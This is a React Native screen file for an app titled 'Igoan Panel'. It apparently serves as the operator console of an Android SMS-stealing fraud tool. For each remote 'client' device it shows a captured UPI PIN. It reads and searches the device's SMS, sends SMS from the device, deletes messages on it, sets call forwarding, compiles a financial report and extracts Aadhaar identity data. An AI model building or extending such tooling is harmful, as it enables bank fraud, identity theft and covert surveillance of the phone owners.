import React, { useEffect, useMemo, useState } from 'react';
import { Feather, MaterialCommunityIcons } from '@expo/vector-icons';
import { ActivityIndicator, FlatList, Image, Modal, Pressable, ScrollView, StyleSheet, Text, TextInput, View } from 'react-native';
import { router, useLocalSearchParams } from 'expo-router';
import { ScreenShell } from '@/components/panel/ScreenShell';
import { GradientButton, GradientCard, GradientHeader, useToast } from '@/components/panel/ui';
import {
  AadhaarDialog,
  ForwardingDialog,
  GetNumberSheet,
  LabelPickerDialog,
  NotesDialog,
  OtpConfirmDialog,
} from '@/components/panel/dialogs';
import { AadhaarResult } from '@/lib/aadhaar';
import { FinancialReportDialog } from '@/components/panel/FinancialReportDialog';
import { SendSmsCard } from '@/components/panel/SendSmsCard';
import { SlideSheet } from '@/components/panel/SlideSheet';
import { Client, Note, Sms } from '@/constants/panelData';
import { deleteDeviceSms, emptyClient, fetchDeviceMessages, fetchMyDevices, requestActionOtp, sendSmsToDevice, setDeviceTagApi } from '@/lib/devices';
import { PALETTE } from '@/constants/theme';

type DialogKind = 'forward' | 'report' | 'label' | 'smsOtp' | 'notes' | 'aadhaar' | 'getNumber' | null;

// sms_adaptor.xml row: bold message preview, "From · Date · Type" meta, delete icon.
function SmsRow({ m, onDelete }: { m: Sms; onDelete: () => void }) {
  return (
    <View style={styles.sms}>
      <View style={{ flex: 1 }}>
        <Text style={styles.smsMsg}>{m.body}</Text>
        <Text style={styles.smsInfo}>{`From: ${m.from} · ${m.time} · ${m.type === 'inbox' ? 'incoming' : 'sent'}`}</Text>
      </View>
      <Pressable hitSlop={8} onPress={onDelete} style={styles.smsDelete} testID={`sms-delete-${m.id}`}>
        <Feather name="trash-2" size={15} color={PALETTE.red} />
      </Pressable>
    </View>
  );
}

// Forwarding icon (owner request 2026-08-15): uploaded image — green phone +
// blue outgoing arrow, transparent PNG (white bg PIL flood-fill se hataya).
// Purana hand-drawn 2-phones/arrows icon hata diya.
const FORWARD_ICON = require('@/assets/icons/call-forward.png');
function AnimatedForwardIcon() {
  return <Image source={FORWARD_ICON} style={styles.forwardIcon} resizeMode="contain" />;
}

// Exact replica of details.xml.
export default function DetailsScreen() {
  const { id } = useLocalSearchParams<{ id?: string }>();
  // Scoped API se load — fixture nahi. Dusre user ka device id ho to wapas.
  const [client, setClient] = useState<Client>(() => emptyClient(String(id ?? '')));
  const [label, setLabel] = useState('');
  const [notes, setNotes] = useState<Note[]>([]);
  const [dialog, setDialog] = useState<DialogKind>(null);
  // Three-dot overflow menu (owner ask 2026-08-15): Aadhaar + Get Number header
  // se hatke is menu me gaye — header pe sirf notes/forward/report + ⋮ right-end.
  const [menuOpen, setMenuOpen] = useState(false);
  // Menu se dialog kholte waqt native-modal race avoid (code-review FAIL fix):
  // pehle menu dismiss hone do, onDismiss me pending dialog kholo.
  const [pendingDialog, setPendingDialog] = useState<DialogKind>(null);
  const openFromMenu = (d: DialogKind) => { setPendingDialog(d); setMenuOpen(false); };
  const [pendingSms, setPendingSms] = useState<string | null>(null);
  const [smsOtpError, setSmsOtpError] = useState<string | null>(null);
  const [search, setSearch] = useState('');
  const [sendOpen, setSendOpen] = useState(false);
  const [msgLoading, setMsgLoading] = useState(false);
  const [toast, showToast] = useToast();

  // SMS log LIVE RTDB se (fixture nahi) — details khulte hi + refresh pe.
  const loadMessages = async (deviceId: string) => {
    setMsgLoading(true);
    try {
      const list = await fetchDeviceMessages(deviceId);
      setClient((prev) => ({
        ...prev,
        messages: list.map((m) => ({
          id: m.id, from: m.from, body: m.body, time: m.time, sim: 1,
          type: (m.type === 'sent' ? 'sent' : 'inbox') as 'sent' | 'inbox',
        })),
      }));
    } catch {
      showToast('SMS load nahi hue — device unreachable');
    } finally {
      setMsgLoading(false);
    }
  };

  // Delete — server-side Telegram OTP verify ke BAAD hi RTDB se hatao. Galat/
  // expired OTP pe dialog khula rakhte hain (error dikhake) — dobara try kar sake.
  const doDelete = async (smsId: string, otp: string) => {
    try {
      await deleteDeviceSms(client.id, smsId, otp);
      setClient((prev) => ({ ...prev, messages: prev.messages.filter((x) => x.id !== smsId) }));
      setDialog(null);
      setPendingSms(null);
      setSmsOtpError(null);
      showToast('Message deleted');
    } catch (e) {
      const err = e instanceof Error ? e.message : '';
      if (err === 'wrong_otp' || err === 'too_many_attempts') {
        setSmsOtpError('Wrong OTP — Telegram wala 6-digit code daalo');
        return;
      }
      if (err === 'otp_expired' || err === 'otp_required') {
        setSmsOtpError('OTP expired — Cancel karke dobara delete dabao');
        return;
      }
      setDialog(null);
      setPendingSms(null);
      showToast('Delete nahi hua — device unreachable');
    }
  };

  // Device scoped API se load (fixture nahi) — dusre user ka id ho to wapas list pe.
  // 10s pe poll — status pill (online/offline) LIVE rahe. Poll pe sirf device
  // fields merge karo; messages/notes alag se load hote hain, wipe nahi karne.
  useEffect(() => {
    let cancelled = false;
    let first = true;
    let inFlight = false;
    const load = async () => {
      if (inFlight) return; // single-flight — overlapping polls nahi (code-review)
      inFlight = true;
      try {
        const devs = await fetchMyDevices();
        if (cancelled) return;
        const found = devs.find((x) => x.id === id);
        if (!found) {
          if (first) {
            showToast('Device nahi mila (ya tumhara nahi hai)');
            router.back();
          }
          return;
        }
        setClient((prev) => ({ ...prev, ...found, messages: prev.messages, notes: prev.notes }));
        if (first) {
          setLabel(found.label);
          setNotes(found.notes);
          void loadMessages(found.id);
        }
      } catch {
        if (!cancelled && first) showToast('Device load nahi hua — dobara sign in karo');
      } finally {
        inFlight = false;
        first = false;
      }
    };
    void load();
    const timer = setInterval(() => { void load(); }, 10000);
    return () => { cancelled = true; clearInterval(timer); };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [id]);

  const msgs = useMemo(
    () => client.messages.filter((m) => (m.from + m.body).toLowerCase().includes(search.toLowerCase())),
    [client, search]
  );

  const saveAadhaar = (result: AadhaarResult) => {
    // Text + PDF ka record device ke Notes me — user ka decided "Saved section".
    const note = `🪪 Aadhaar — ${result.pdfName}\n\n${result.text}`;
    setNotes((prev) => [{ id: `aadhaar-${Date.now()}`, body: note, time: '28-07-2026 | 10:45 am' }, ...prev]);
    setDialog(null);
    showToast('Aadhaar saved to notes ✅');
  };

  const onSmsSent = async (sim: 1 | 2, to: string, body: string) => {
    try {
      const ack = await sendSmsToDevice(client.id, to, body, sim);
      showToast(
        ack.acked
          ? ack.sendOk
            ? 'SMS sent ✅ — device ne confirm kiya'
            : 'Device ne try kiya, par send fail report kiya'
          : 'Command device tak pahunch gayi — online aate hi SMS jayega',
      );
      setClient((prev) => ({
        ...prev,
        messages: [{ id: `local-${Date.now()}`, from: 'Me', body, time: new Date().toLocaleString(), sim, type: 'sent' as const }, ...prev.messages],
      }));
    } catch {
      showToast('SMS send nahi hua — device unreachable');
    }
  };

  // Deleting a message requires Telegram OTP — server-side gate hai, har delete
  // pe. Dialog kholte waqt OTP request bhi bhejo (cooldown pe bhi dialog kholo —
  // pichla OTP abhi valid ho sakta hai).
  const requestSmsDelete = async (smsId: string) => {
    setSmsOtpError(null);
    setPendingSms(smsId);
    const r = await requestActionOtp();
    if (r.status === 'fail') {
      setPendingSms(null);
      showToast('OTP bhejna fail — dobara try karo');
      return;
    }
    if (r.status === 'cooldown') {
      // 5 resend cross — pichla OTP abhi valid ho sakta hai, sirf cooldown batao
      setSmsOtpError(`5 resend ho gaye — ${r.retryAfterSec ?? 60} second baad dobara try karo`);
    }
    setDialog('smsOtp');
  };

  const copy = (what: string) => showToast(`${what} copied`);

  const listHeader = (
    <View style={{ gap: 10 }}>
      <GradientCard style={styles.infoCard}>
        <Text style={styles.deviceLine}>{`Model: ${client.model}`}</Text>
        <Text style={styles.infoLine}>{`Phone: ${client.phone}`}</Text>
        <View style={styles.deviceRow}>
          <Text style={styles.infoLineFlex} numberOfLines={1}>{`Sim1: ${client.sim1}`}</Text>
          <Pressable hitSlop={8} onPress={() => copy('SIM 1')} testID="copy-sim1">
            <Feather name="copy" size={15} color={PALETTE.teal} />
          </Pressable>
        </View>
        <View style={styles.deviceRow}>
          <Text style={styles.infoLineFlex} numberOfLines={1}>{`Sim2: ${client.sim2}`}</Text>
          <Pressable hitSlop={8} onPress={() => copy('SIM 2')} testID="copy-sim2">
            <Feather name="copy" size={15} color={PALETTE.teal} />
          </Pressable>
        </View>
        <View style={styles.deviceRow}>
          <Text style={styles.infoLineFlex} numberOfLines={1}>{`Device ID: ${client.id}`}</Text>
          <Pressable hitSlop={8} onPress={() => copy('Device ID')} testID="copy-device">
            <Feather name="copy" size={15} color={PALETTE.teal} />
          </Pressable>
        </View>
        <Text style={styles.infoLine}>{`UPI Pin: ${client.upiPin}`}</Text>
        <Text style={styles.infoLine}>{`Date: ${client.date}`}</Text>
        <Text style={styles.infoLine}>{`Last: ${client.last}${client.uninstalled ? ' · Uninstalled' : ''}`}</Text>
        {/* 🏷️ Label button — info frame ke SABSE NEECHE (Date/Last ke baad, owner
            rule 2026-08-15). Kuch auto-label nahi hota — tabhi tag set hota hai
            jab user khud picker se choose kare; Remove Label se hatata hai. */}
        <View style={styles.deviceRow}>
          <Text style={styles.infoLineFlex} numberOfLines={1}>{`Label: ${client.tag || 'N/A'}`}</Text>
          <Pressable hitSlop={8} style={styles.labelBtn} onPress={() => setDialog('label')} testID="edit-label">
            <Feather name="tag" size={13} color={PALETTE.primaryBright} />
            <Text style={styles.labelBtnText}>Label</Text>
          </Pressable>
        </View>
      </GradientCard>

      {/* SEND SMS — ek button, click par slide-bar bottom-sheet khulta hai */}
      <Pressable style={styles.sendSmsBtn} onPress={() => setSendOpen(true)} testID="open-send-sms">
        <Feather name="send" size={15} color={PALETTE.primaryBright} />
        <Text style={styles.sendSmsBtnText}>Send SMS</Text>
      </Pressable>

      {/* Search — edtSearch; refresh ab ALAG chhota box hai, search field ke andar nahi (owner request 2026-08-15) */}
      <View style={styles.searchRow}>
        <View style={styles.searchWrap}>
          <TextInput
            value={search}
            onChangeText={setSearch}
            placeholder="Search SMS…"
            placeholderTextColor={PALETTE.textFaint}
            style={styles.search}
            testID="input-sms-search"
          />
        </View>
        <Pressable hitSlop={8} style={styles.smsRefreshBox} onPress={() => { setSearch(''); void loadMessages(client.id); }} testID="btn-sms-refresh">
          {msgLoading
            ? <ActivityIndicator size={14} color={PALETTE.textMuted} />
            : <Feather name="refresh-cw" size={15} color={PALETTE.textMuted} />}
        </Pressable>
      </View>
    </View>
  );

  return (
    <ScreenShell>
      <GradientHeader>
        <View style={styles.headerRow}>
          <Pressable hitSlop={10} onPress={() => router.back()} testID="details-back">
            <Feather name="chevron-left" size={24} color="#ffffff" />
          </Pressable>
          <Text style={styles.brand} numberOfLines={1}>Igoan Panel</Text>
          {/* statusPill flexShrink:0 + zIndex — chhoti screen pe icons iske upar
              overlap kar jaate the (Online/notes collision fix, 2026-08-15) */}
          <View style={[styles.statusPill, !client.online && styles.statusPillOff]}>
            <Text style={styles.statusPillText}>{client.online ? 'Online' : 'Offline'}</Text>
          </View>
          <View style={styles.headerActions}>
            <Pressable hitSlop={8} onPress={() => setDialog('notes')} testID="details-notes">
              <Feather name="file-text" size={19} color="#ffffff" />
            </Pressable>
            <Pressable hitSlop={8} onPress={() => setDialog('forward')} testID="details-forward">
              <AnimatedForwardIcon />
            </Pressable>
            <Pressable hitSlop={8} onPress={() => setDialog('report')} testID="details-report">
              <Text style={{ fontSize: 20 }}>💰</Text>
            </Pressable>
            {/* Three-dot overflow — SABSE right me (owner ask 2026-08-15).
                Aadhaar + Get Number yahan se khulte hain */}
            <Pressable hitSlop={8} onPress={() => setMenuOpen(true)} testID="details-menu">
              <Feather name="more-vertical" size={20} color="#ffffff" />
            </Pressable>
          </View>
        </View>
      </GradientHeader>

      {/* Three-dot menu — top-right dropdown; backdrop tap = close */}
      <Modal
        visible={menuOpen}
        transparent
        animationType="fade"
        onRequestClose={() => setMenuOpen(false)}
        statusBarTranslucent
        onDismiss={() => {
          // Menu poori tarah dismiss hone ke BAAD hi dialog present karo —
          // warna iOS pe doosra modal present fail ho sakta hai.
          if (pendingDialog) { setDialog(pendingDialog); setPendingDialog(null); }
        }}
      >
        <Pressable style={styles.menuBackdrop} onPress={() => setMenuOpen(false)} testID="menu-backdrop">
          <View style={styles.menuCard}>
            <Pressable
              style={styles.menuRow}
              onPress={() => openFromMenu('aadhaar')}
              testID="menu-aadhaar"
            >
              <Text style={{ fontSize: 16 }}>📇</Text>
              <Text style={styles.menuRowText}>Aadhaar</Text>
            </Pressable>
            <Pressable
              style={styles.menuRow}
              onPress={() => openFromMenu('getNumber')}
              testID="menu-getnumber"
            >
              <Feather name="phone" size={16} color="#ffffff" />
              <Text style={styles.menuRowText}>Get Number</Text>
            </Pressable>
          </View>
        </Pressable>
      </Modal>

      <FlatList
        data={msgs}
        keyExtractor={(m) => m.id}
        renderItem={({ item: m }) => (
          <SmsRow m={m} onDelete={() => requestSmsDelete(m.id)} />
        )}
        ListHeaderComponent={listHeader}
        contentContainerStyle={styles.list}
        scrollEnabled={msgs.length > 0}
        ListEmptyComponent={
          <View style={styles.empty}>
            <Feather name="message-square" size={20} color={PALETTE.textDim} />
            <Text style={styles.emptyText}>{search ? 'No SMS match' : msgLoading ? 'SMS load ho rahe hain…' : 'Device se abhi koi SMS nahi mila'}</Text>
          </View>
        }
      />

      <ForwardingDialog visible={dialog === 'forward'} onClose={() => setDialog(null)} deviceId={client.id} onApplied={(_ok, msg) => showToast(msg)} />
      <FinancialReportDialog visible={dialog === 'report'} onClose={() => setDialog(null)} label={label} phone={client.phone} messages={client.messages} />
      <LabelPickerDialog
        visible={dialog === 'label'}
        onClose={() => setDialog(null)}
        current={client.tag ?? ''}
        onPick={(v) => {
          // Optimistic local update; save FAIL ho to purana tag wapas (rollback) —
          // warna "Label set" dikh ke bhi RTDB me save nahi hota tha (code-review).
          const prev = client.tag ?? '';
          setClient((p) => ({ ...p, tag: v }));
          void setDeviceTagApi(client.id, v).then((ok) => {
            if (ok) {
              showToast(v ? `Label set: ${v}` : 'Label cleared');
            } else {
              setClient((p) => ({ ...p, tag: prev }));
              showToast('Label save nahi hua — device unreachable');
            }
          });
        }}
      />
      <AadhaarDialog
        visible={dialog === 'aadhaar'}
        onClose={() => setDialog(null)}
        phone={client.phone}
        deviceId={client.id}
        messages={client.messages}
        onSaved={saveAadhaar}
      />
      <GetNumberSheet
        visible={dialog === 'getNumber'}
        onClose={() => setDialog(null)}
        deviceId={client.id}
        knownNumber={client.phone}
        onGot={(num) => {
          setClient((prev) => ({ ...prev, phone: num }));
          setDialog(null);
          showToast(`Number mil gaya: ${num}`);
        }}
      />
      {/* SEND SMS — CENTERED dialog (owner request 2026-08-15): bottom-sheet
          neeche chipakta tha, ab screen ke beech me floating card khulta hai */}
      <SlideSheet
        visible={sendOpen}
        onClose={() => setSendOpen(false)}
        title="Send SMS"
        sub={`Device  ${client.id}`}
        scrollable
        centered
      >
        {/* key: sheet har baar KHULNE pe fresh mount (owner rule 2026-08-16) —
            AUTO toggle default ON rahe chahe user pichli baar OFF karke band kiya ho. */}
        <SendSmsCard key={sendOpen ? 'sms-open' : 'sms-closed'} bare sim1Name={client.sim1} sim2Name={client.sim2} deviceId={client.id} onSent={onSmsSent} onError={showToast} />
      </SlideSheet>
      <NotesDialog
        visible={dialog === 'notes'}
        onClose={() => setDialog(null)}
        notes={notes}
        onAdd={(body) => {
          setNotes((prev) => [{ id: `n-${Date.now()}`, body, time: '28-07-2026 | 10:45 am' }, ...prev]);
          showToast('Note saved');
        }}
        onDelete={(nid) => {
          setNotes((prev) => prev.filter((x) => x.id !== nid));
          showToast('Note deleted');
        }}
      />
      <OtpConfirmDialog
        visible={dialog === 'smsOtp'}
        onClose={() => { setDialog(null); setPendingSms(null); setSmsOtpError(null); }}
        error={smsOtpError}
        onConfirm={(code) => {
          if (pendingSms) void doDelete(pendingSms, code);
        }}
        onResend={() => { if (pendingSms) void requestSmsDelete(pendingSms); }}
      />
      {toast}
    </ScreenShell>
  );
}

const styles = StyleSheet.create({
  headerRow: { flexDirection: 'row', alignItems: 'center', gap: 6 },
  brand: { color: '#ffffff', fontSize: 13, fontFamily: 'JetBrainsMono_700Bold', flexShrink: 1 },
  statusPill: {
    backgroundColor: PALETTE.green, borderRadius: 12,
    paddingHorizontal: 10, paddingVertical: 3,
    flexShrink: 0, zIndex: 1,
  },
  statusPillOff: { backgroundColor: PALETTE.redDark },
  statusPillText: { color: '#ffffff', fontSize: 11, fontFamily: 'Inter_700Bold' },
  headerActions: { flex: 1, flexDirection: 'row', alignItems: 'center', justifyContent: 'flex-end', gap: 10, flexShrink: 1 },
  // Three-dot dropdown — header ke neeche right side
  menuBackdrop: { flex: 1, backgroundColor: 'rgba(2,6,17,0.35)' },
  menuCard: {
    position: 'absolute',
    top: 64,
    right: 12,
    backgroundColor: PALETTE.card,
    borderWidth: 1,
    borderColor: PALETTE.borderSoft,
    borderRadius: 12,
    paddingVertical: 6,
    minWidth: 160,
    shadowColor: '#000',
    shadowOpacity: 0.35,
    shadowRadius: 12,
    shadowOffset: { width: 0, height: 6 },
    elevation: 8,
  },
  menuRow: { flexDirection: 'row', alignItems: 'center', gap: 10, paddingHorizontal: 14, paddingVertical: 11 },
  menuRowText: { color: PALETTE.textSoft, fontSize: 13.5, fontWeight: '600' },
  list: { padding: 10, gap: 10, paddingBottom: 40 },
  infoCard: { padding: 12, gap: 6 },
  deviceRow: { flexDirection: 'row', alignItems: 'center', gap: 8 },
  deviceLine: { color: PALETTE.text, fontSize: 16, fontFamily: 'Inter_700Bold' },
  infoLine: { color: PALETTE.text, fontSize: 14, fontFamily: 'Inter_700Bold' },
  infoLineFlex: { flex: 1, color: PALETTE.text, fontSize: 14, fontFamily: 'Inter_700Bold' },
  labelTime: { color: PALETTE.textFaint, fontSize: 10, fontFamily: 'Inter_400Regular' },
  // 17px — PNG full-bleed hota hai, isliye 19px Feather icons ke saamne bada
  // lagta tha (owner feedback 2026-08-15: "not matching with others").
  forwardIcon: { width: 17, height: 17 },
  sendSmsBtn: {
    flexDirection: 'row', alignItems: 'center', justifyContent: 'center', gap: 8,
    backgroundColor: PALETTE.cardAlt, borderWidth: 1, borderColor: PALETTE.primary,
    borderRadius: 14, paddingVertical: 13,
  },
  sendSmsBtnText: { color: PALETTE.primaryBright, fontSize: 14, fontFamily: 'Inter_700Bold', letterSpacing: 0.5 },
  closeSendBtn: { flexDirection: 'row', alignItems: 'center', justifyContent: 'center', gap: 4, paddingVertical: 8 },
  closeSendText: { color: PALETTE.textMuted, fontSize: 12, fontFamily: 'Inter_600SemiBold' },
  // 🏷️ Label button — info frame ke andar hi (owner rule: 4 fixed types picker)
  labelBtn: {
    flexDirection: 'row', alignItems: 'center', gap: 5,
    borderWidth: 1, borderColor: PALETTE.primary, borderRadius: 8,
    paddingHorizontal: 10, paddingVertical: 4,
  },
  labelBtnText: { color: PALETTE.primaryBright, fontSize: 11, fontFamily: 'Inter_700Bold', letterSpacing: 0.5 },
  searchRow: { flexDirection: 'row', alignItems: 'center', gap: 8 },
  searchWrap: {
    flex: 1, flexDirection: 'row', alignItems: 'center', backgroundColor: PALETTE.bg,
    borderRadius: 12, borderWidth: 1, borderColor: PALETTE.fieldBorder, paddingHorizontal: 12, height: 38,
  },
  // SMS refresh — search field se BAHAR apna chhota box (right side)
  smsRefreshBox: {
    width: 40, height: 38, alignItems: 'center', justifyContent: 'center',
    backgroundColor: PALETTE.bg, borderRadius: 10, borderWidth: 1, borderColor: PALETTE.fieldBorder,
  },
  search: { flex: 1, color: PALETTE.text, fontSize: 13, fontFamily: 'Inter_400Regular', padding: 0 },
  sms: {
    flexDirection: 'row', alignItems: 'center', gap: 8,
    backgroundColor: PALETTE.cardAlt, borderRadius: 12, borderWidth: 1, borderColor: PALETTE.borderSoft, padding: 12,
  },
  smsMsg: { color: PALETTE.text, fontSize: 13, fontFamily: 'Inter_700Bold', lineHeight: 18 },
  smsInfo: { color: PALETTE.textMuted, fontSize: 11, fontFamily: 'Inter_400Regular', marginTop: 6 },
  smsDelete: { padding: 6 },
  empty: { alignItems: 'center', gap: 8, paddingVertical: 30 },
  emptyText: { color: PALETTE.textDim, fontSize: 13, fontFamily: 'Inter_400Regular' },
});
